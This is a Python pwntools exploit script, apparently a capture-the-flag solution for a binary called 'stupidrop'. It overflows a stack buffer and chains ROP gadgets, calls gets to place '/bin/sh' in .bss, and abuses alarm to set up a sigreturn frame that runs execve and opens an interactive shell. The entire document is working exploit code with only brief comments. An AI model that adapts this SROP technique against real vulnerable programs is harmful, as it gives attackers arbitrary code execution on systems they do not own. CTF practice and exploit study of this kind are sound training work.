from pwn import *

p = process(['./stupidrop'])

elf = ELF('./stupidrop',checksec=False)

# context.log_level = 'debug'
context.arch = 'amd64'

syscall = 0x000000000040063e
pop_rdi = 0x00000000004006a3
_bss = 0x601057 # empty on bss. find writable adress to write /bin/sh\x00

offset = b'A'*56

payload = offset
payload += p64(pop_rdi)
payload += p64(_bss)
payload += p64(elf.symbols['gets'])

payload += p64(pop_rdi)
payload += p64(0xf) # to set rax to sigret
payload += p64(elf.symbols['alarm'])
payload += p64(pop_rdi)
payload += p64(0x0)
payload += p64(elf.symbols['alarm'])

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b # execve
frame.rdi = _bss # address /bin/sh
frame.rsi = 0x0
frame.rdx = 0x0

payload += p64(syscall)
payload += bytes(frame)

# gdb.attach(p,gdbscript="""init-gef
# br *0x40063d""")

p.sendline(payload)
# raw_input()
# p.recvline()
p.sendline(b'/bin/sh\x00')

p.interactive()
